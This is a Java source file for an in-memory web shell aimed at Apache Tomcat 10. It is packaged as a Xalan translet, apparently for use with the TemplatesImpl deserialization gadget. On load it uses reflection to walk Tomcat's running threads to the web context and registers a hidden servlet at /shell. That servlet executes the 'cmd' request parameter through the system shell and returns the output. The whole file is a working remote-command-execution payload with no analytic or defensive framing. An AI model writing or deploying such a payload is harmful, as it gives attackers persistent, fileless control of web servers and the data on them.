package test;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Scanner;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardHost;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import jakarta.servlet.Servlet;
import jakarta.servlet.ServletConfig;
import jakarta.servlet.ServletException;
import jakarta.servlet.ServletRequest;
import jakarta.servlet.ServletResponse;


public class TemplatesImplTomcat10ServletShell extends AbstractTranslet implements  Servlet{
    String serverNameMB;
    
    public TemplatesImplTomcat10ServletShell() throws Exception {
    	setMB();
    	ThreadGroup group = Thread.currentThread().getThreadGroup();
    	Thread[] threads = (Thread[]) getFieldValue(group, "threads");
    	for(int i = 0; i < threads.length; i++) {
    	    try{
    	        Thread t = threads[i];
    	        if (t == null) continue;
    	        String str = t.getName();
    	        if (str.contains("exec") || !str.contains("http")) continue;
    	        Object obj = getFieldValue(t, "target");
    	        if (!(obj instanceof Runnable)) continue;
    	        obj = getFieldValue(obj, "this$0");
    	        obj = getFieldValue(obj, "handler");
    	        obj = getFieldValue(obj, "proto");
    	        obj = getFieldValue(obj, "adapter");
    	        obj = getFieldValue(obj, "connector");
    	        obj = getFieldValue(obj, "service");
		        try {
		        	obj = getFieldValue(obj, "engine");
		        }catch (Exception e) {
		        	obj = getFieldValue(obj, "container");
		        }
    	        HashMap children = (HashMap) getFieldValue(obj, "children");
                StandardHost standardHost = (StandardHost) children.get(serverNameMB);
                children = (HashMap) getFieldValue(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                StandardContext standardContext = (StandardContext) children.get("");
			    Wrapper wrapper = standardContext.createWrapper();
			    wrapper.setName("shell");
			    wrapper.setServlet(this);
			    standardContext.addChild(wrapper);
			    try {
			        Method addServlet = StandardContext.class.getMethod("addServletMappingDecoded", String.class, String.class);
			        addServlet.invoke(standardContext, "/shell", "shell");
			    }catch (Exception e) {
			        Method addServlet = StandardContext.class.getMethod("addServletMapping", String.class, String.class);
			        addServlet.invoke(standardContext, "/shell", "shell");
				}
			    break;
    	    }catch(Exception e){
    	        continue;
    	    }
    	}
    }
    private void setMB() throws Exception {
    	boolean flag = false;
    	ThreadGroup group = Thread.currentThread().getThreadGroup();
    	Thread[] threads = (Thread[]) getFieldValue(group, "threads");
    	for(int i = 0; i < threads.length; i++) {
	        if (flag)  break;
    	    try{
    	        Thread t = threads[i];
    	        if (t == null) continue;
    	        String str = t.getName();
    	        if (str.contains("exec") || !str.contains("http")) continue;
    	        Object obj = getFieldValue(t, "target");
    	        if (!(obj instanceof Runnable)) continue;
    	        obj = getFieldValue(obj, "this$0");
    	        obj = getFieldValue(obj, "handler");
    	        obj = getFieldValue(obj, "global");
    	        ArrayList<?> processors = (ArrayList<?>) getFieldValue(obj, "processors");
    	        for(int j = 0; j < processors.size(); ++j) {
    	        	if (flag)  break;
    	            Object processor = processors.get(j);
    	            Object req = getFieldValue(processor, "req");
    	            Object serverPort = getFieldValue(req, "serverPort");
                    if (serverPort.equals(-1)) continue;
    	            serverNameMB = (String) getFieldValue(req, "serverNameMB").toString();
    	            if(serverNameMB != null) {
    	            	flag = true;
    	            }
    	        }
    	    }catch(Exception e){
    	        continue;
    	    }
    	}
		
	}
	@Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
    	try {
    		Field field = obj.getClass().getDeclaredField(fieldName);
    		field.setAccessible(true);
            return field.get(obj);
		} catch (Exception e) {
			return getFieldValue(obj, obj.getClass(), fieldName);
		}
    }
    public static Object getFieldValue(Object obj, Class<?> clazz, String fieldName) throws Exception {
    	Field field;
    	clazz = clazz.getSuperclass();
    	try {
    		field = clazz.getDeclaredField(fieldName);
    		field.setAccessible(true);
            return field.get(obj);
		} catch (Exception e) {
			return getFieldValue(obj, clazz, fieldName);
		}
    }
	@Override
	public void init(ServletConfig config) throws ServletException {
	}
	@Override
	public ServletConfig getServletConfig() {
		return null;
	}
	@Override
    public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
        String cmd = request.getParameter("cmd");
        boolean isWin = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
        String[] cmds = isWin ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\a");
		String output = s.hasNext() ? s.next() : "";
        PrintWriter out = response.getWriter();
        response.getWriter().write(output);
        response.getWriter().flush();
    }
	@Override
	public String getServletInfo() {
		return null;
	}
	@Override
	public void destroy() {
	}
}
